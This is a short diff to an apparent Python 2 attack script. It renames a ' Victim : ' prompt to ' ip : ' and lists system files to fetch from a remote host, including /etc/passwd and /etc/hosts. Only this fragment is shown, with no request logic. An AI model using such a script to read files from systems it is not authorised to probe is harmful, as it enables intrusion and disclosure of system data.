@@ -1,6 +1,6 @@
 import urllib2
 
-host = raw_input(" Victim : ")
+host = raw_input(" ip : ")
 path = list(("/etc/passwd", "/etc/hosts"))
 path.append("/etc/hostname")
 path.append("/etc/issue")
